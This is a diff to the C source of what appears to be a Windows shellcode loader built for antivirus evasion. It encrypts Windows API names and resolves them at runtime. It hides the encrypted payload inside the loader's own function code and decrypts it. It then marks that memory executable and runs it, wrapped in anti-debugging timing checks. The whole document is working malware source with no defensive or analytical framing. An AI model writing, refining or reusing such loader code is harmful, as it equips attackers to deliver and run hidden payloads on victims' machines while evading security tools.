@@ -1,7 +1,9 @@
 #include "loader.h"
 
-#include "payload_enc.c"
+// #include "payload_enc.c"
 #include "entropy_low.c"
+#include "macro_enc.h"
+
 // #include "dynamic_strings.c"
 
 
@@ -29,55 +31,79 @@ void* args[] = {NULL, NULL, NULL, NULL, NULL, NULL, stepOverExit};
 
 
 
-HMODULE Kernel32Module;
-HMODULE WininetModule;
-HMODULE user32Module;
-pCreateDesktopW _CreateDesktopW;
-pSetThreadDesktop _SetThreadDesktop;
-MessageBoxWFunc _MessageBoxW;
-pVirtualProtect _VirtualProtect;
-pCreateFileW _CreateFileW;
-pWriteFile _WriteFile;
-pCloseHandle _CloseHandle;
-pInternetOpenW _InternetOpen;
-pInternetOpenUrlA _InternetOpenUrlA;
-pInternetReadFile _InternetReadFile;
-pInternetCloseHandle _InternetCloseHandle;
-pGetLastError _GetLastError;
-pCreateThread _CreateThread;
-pCloseHandle _CloseHandle;
-pCloseDesktop _CloseDesktop;
+HMODULE Kernel32Module = NULL;
+HMODULE WininetModule = NULL;
+HMODULE user32Module = NULL;
+pCreateDesktopW _CreateDesktopW = NULL;
+pSetThreadDesktop _SetThreadDesktop = NULL;
+MessageBoxWFunc _MessageBoxW = NULL;
+pVirtualProtect _VirtualProtect = NULL;
+pCreateFileW _CreateFileW = NULL;
+pWriteFile _WriteFile = NULL;
+pInternetOpenW _InternetOpen = NULL;
+pInternetOpenUrlA _InternetOpenUrlA = NULL;
+pInternetReadFile _InternetReadFile = NULL;
+pInternetCloseHandle _InternetCloseHandle = NULL;
+pGetLastError _GetLastError = NULL;
+pCreateThread _CreateThread = NULL;
+pCloseHandle _CloseHandle = NULL;
+pCloseDesktop _CloseDesktop = NULL;
 pGetSystemTime _GetSystemTime = NULL;
-pExitProcess _ExitProcess;
+pExitProcess _ExitProcess = NULL;
 
-extern unsigned char cMessageBoxW[];
-extern unsigned char cVirtualProtect[];
-extern unsigned char cCreateFileW[];
-extern unsigned char cWriteFile[];
-extern unsigned char cCloseHandle[];
-extern unsigned char cGetSystemTime[];
-extern unsigned char cInternetOpenW[];
-extern unsigned char cInternetOpenUrlA[];
-extern unsigned char cInternetReadFile[];
-extern unsigned char cInternetCloseHandle[];
-extern unsigned char cGetLastError[];
-extern unsigned char cCreateDisktopW[];
-extern unsigned char cSetThreadDesktop[];
-extern unsigned char cCreateThread[];
-extern unsigned char cCloseDesktop[];
-extern unsigned char cExitProcess[];
-extern unsigned char cRtlExitUserProcess[];
-extern unsigned char cLdrLoadDll[];
-extern unsigned char cRtlInitUnicodeString[];
-extern unsigned char sKernelbase[];
-extern unsigned char sWininet[];
-extern unsigned char sUser32[];
-extern unsigned char sNtdll[];
-extern unsigned char sntdll_full_path[];
+extern unsigned char _cMessageBoxW[16];
+extern unsigned char _cVirtualProtect[16];
+extern unsigned char _cCreateFileW[16];
+extern unsigned char _cWriteFile[16];
+extern unsigned char _cCloseHandle[16];
+extern unsigned char _cGetSystemTime[16];
+extern unsigned char _cInternetOpenW[16];
+extern unsigned char _cInternetOpenUrlA[32];
+extern unsigned char _cInternetReadFile[32];
+extern unsigned char _cInternetCloseHandle[32];
+extern unsigned char _cGetLastError[16];
+extern unsigned char _cCreateDisktopW[16];
+extern unsigned char _cSetThreadDesktop[32];
+extern unsigned char _cCreateThread[16];
+extern unsigned char _cCloseDesktop[16];
+extern unsigned char _cExitProcess[16];
+extern unsigned char _cRtlExitUserProcess[32];
+extern unsigned char _cLdrLoadDll[16];
+extern unsigned char _cRtlInitUnicodeString[32];
+extern unsigned char _sKernelbase[32];
+extern unsigned char _sWininet[32];
+extern unsigned char _sUser32[32];
+extern unsigned char _sNtdll[32];
+extern unsigned char _sntdll_full_path[64];
+extern unsigned char MasterKeyStrings[16];
+extern unsigned char _MasterKeyPayload[16];
+
+unsigned char cMessageBoxW[16];
+unsigned char cVirtualProtect[16];
+unsigned char cCreateFileW[16];
+unsigned char cWriteFile[16];
+unsigned char cCloseHandle[16];
+unsigned char cGetSystemTime[16];
+unsigned char cInternetOpenW[16];
+unsigned char cInternetOpenUrlA[32];
+unsigned char cInternetReadFile[32];
+unsigned char cInternetCloseHandle[32];
+unsigned char cGetLastError[16];
+unsigned char cCreateDisktopW[16];
+unsigned char cSetThreadDesktop[32];
+unsigned char cCreateThread[16];
+unsigned char cCloseDesktop[16];
+unsigned char cExitProcess[16];
+unsigned char cRtlExitUserProcess[32];
+unsigned char cLdrLoadDll[16];
+unsigned char cRtlInitUnicodeString[32];
+unsigned char sKernelbase[32];
+unsigned char sWininet[32];
+unsigned char sUser32[32];
+unsigned char sNtdll[32];
+unsigned char sntdll_full_path[64];
+unsigned char MasterKeyPayload[16];
 /* FIXME: GetEnvironmentVariableA("WINDIR", buf, sz) instead of C:\\ */
-extern unsigned char MasterKeyStrings[];
-extern unsigned char MasterKeyPayload[];
-
 
 
 volatile int mutex_setupWinApi = 0;
@@ -103,8 +129,8 @@ DWORD WINAPI setupWinApi(){
     _InternetOpenUrlA = (pInternetOpenUrlA)_GetProcAddress(WininetModule, cInternetOpenUrlA);
     _InternetReadFile = (pInternetReadFile)_GetProcAddress(WininetModule, cInternetReadFile);
     _InternetCloseHandle = (pInternetCloseHandle)_GetProcAddress(WininetModule, cInternetCloseHandle);
+    _ExitProcess = (pExitProcess)_GetProcAddressNative(cRtlExitUserProcess);
     _GetLastError = (pGetLastError)_GetProcAddress(Kernel32Module,cGetLastError);
-    _ExitProcess = (pExitProcess)(cRtlExitUserProcess);
 
     x = y * x & 4 % 6;
     y = x * x;
@@ -114,40 +140,58 @@ DWORD WINAPI setupWinApi(){
 
 int pseudo_main(){
     // DYNAMIC_RETURN;
+    payload_enc_asm;
     int sz = 0;
     payload p;
     DWORD threadId;
     HANDLE threadHandle;
     unsigned char KeyList[176];
     DWORD junk[sizeof(PDWORD)];
-    unsigned char execute_me[sizeof(payload_enc_bytes)];
+        // FIXME Payload size hardcoded
+    unsigned char exec_macro[PAYLOAD_LEN];
     unsigned char buf[200 * 1024];
     int x = 58;
     int y = 18;
-
+    unsigned char* copyme[] = {_cExitProcess, _cCloseDesktop, _cMessageBoxW,
+                                    _cVirtualProtect, _cCreateFileW,
+                                    _cWriteFile, _cCloseHandle, _cInternetOpenW,
+                                    _cInternetOpenUrlA, _cInternetOpenUrlA + 16,
+                                    _cInternetReadFile, _cInternetReadFile + 16,
+                                    _cInternetCloseHandle, _cInternetCloseHandle + 16,
+                                    _cGetLastError, _cCreateDisktopW, _cSetThreadDesktop,
+                                    _cSetThreadDesktop + 16, _cCreateThread, _cGetSystemTime,
+                                    _cRtlExitUserProcess, _cRtlExitUserProcess + 16,
+                                    _sKernelbase, _sKernelbase + 16, _sUser32, _sUser32 + 16,
+                                    _sWininet, _sWininet + 16, _sNtdll, _sNtdll + 16,
+                                    _sntdll_full_path, _sntdll_full_path + 16,
+                                    _sntdll_full_path + 32, _sntdll_full_path + 48,
+                                    _cLdrLoadDll, _cRtlInitUnicodeString,
+                                    _cRtlInitUnicodeString + 16, _MasterKeyPayload};
+    unsigned char* decryptme[] = {cExitProcess, cCloseDesktop, cMessageBoxW,
+                                    cVirtualProtect, cCreateFileW,
+                                    cWriteFile, cCloseHandle, cInternetOpenW,
+                                    cInternetOpenUrlA, cInternetOpenUrlA + 16,
+                                    cInternetReadFile, cInternetReadFile + 16,
+                                    cInternetCloseHandle, cInternetCloseHandle + 16,
+                                    cGetLastError, cCreateDisktopW, cSetThreadDesktop,
+                                    cSetThreadDesktop + 16, cCreateThread, cGetSystemTime,
+                                    cRtlExitUserProcess, cRtlExitUserProcess + 16,
+                                    sKernelbase, sKernelbase + 16, sUser32, sUser32 + 16,
+                                    sWininet, sWininet + 16, sNtdll, sNtdll + 16,
+                                    sntdll_full_path, sntdll_full_path + 16,
+                                    sntdll_full_path + 32, sntdll_full_path + 48,
+                                    cLdrLoadDll, cRtlInitUnicodeString,
+                                    cRtlInitUnicodeString + 16, MasterKeyPayload};
     #ifndef DEBUG
     TOMFOOLERY
     #endif
 
     INIT_CONST();
     KeyScheduler(MasterKeyStrings, KeyList);
-    unsigned char* decryptme[] = {cExitProcess, cCloseDesktop, cMessageBoxW,
-                                     cVirtualProtect, cCreateFileW,
-                                     cWriteFile, cCloseHandle, cInternetOpenW,
-                                     cInternetOpenUrlA, cInternetOpenUrlA + 16,
-                                     cInternetReadFile, cInternetReadFile + 16,
-                                     cInternetCloseHandle, cInternetCloseHandle + 16,
-                                     cGetLastError, cCreateDisktopW, cSetThreadDesktop,
-                                     cSetThreadDesktop + 16, cCreateThread, cGetSystemTime,
-                                     cRtlExitUserProcess, cRtlExitUserProcess + 16,
-                                     sKernelbase, sKernelbase + 16, sUser32, sUser32 + 16,
-                                     sWininet, sWininet + 16, sNtdll, sNtdll + 16,
-                                     sntdll_full_path, sntdll_full_path + 16,
-                                     sntdll_full_path + 32, sntdll_full_path + 48,
-                                     cLdrLoadDll, cRtlInitUnicodeString,
-                                     cRtlInitUnicodeString + 16, MasterKeyPayload};
+
     // FIXME: Change hardcoded i parameter every time you update decryptme
     for (int i = 0; i < sizeof(decryptme)/8; ++i){
+        memcpy(decryptme[i], copyme[i], 16);
         Decrypt(decryptme[i], KeyList);
     }
     Kernel32Module = _LoadLibrary((LPWSTR)sKernelbase);
@@ -201,18 +245,25 @@ int pseudo_main(){
     SHORT_JMP
     #endif
     KeyScheduler(MasterKeyPayload, KeyList);
-    memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
-    for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
-        Decrypt(execute_me + i, KeyList);
+    unsigned char* payload_ptr = (unsigned char*) pseudo_main + 34;
+    // FIXME Payload size hardcoded
+    for (int i = 0, bi = 0; i < PAYLOAD_LEN/4*7;){
+        i += 3;
+        memcpy(exec_macro + bi, payload_ptr + i, 4);
+        bi += 4;
+        i += 4;
+    }
+    for (int i = 0; i < PAYLOAD_LEN; i += 16){
+        Decrypt(exec_macro + i, KeyList);
     }
     #ifndef DEBUG
     CHECK_TIME
     #endif
-    _VirtualProtect(execute_me, sizeof(payload_enc_bytes),PAGE_EXECUTE_READWRITE, (PDWORD)&junk);
+    _VirtualProtect(exec_macro, PAYLOAD_LEN,PAGE_EXECUTE_READWRITE, (PDWORD)&junk);
     #ifndef DEBUG
     CHECK_TIME
     #endif
-    p = (payload)(execute_me);
+    p = (payload)(exec_macro);
     #ifndef DEBUG
     CHECK_TIME
     #endif
@@ -227,11 +278,11 @@ int pseudo_main(){
     #ifdef DEBUG
     _MessageBoxW(NULL, L"OK", L"OK", MB_OK);
     #endif
+    _ExitProcess(0);
     return x + y;
 }
 
 void WinMainCRTStartup(){
     // DYNAMIC_RETURN;
     pseudo_main();
-    _ExitProcess(0);
 }
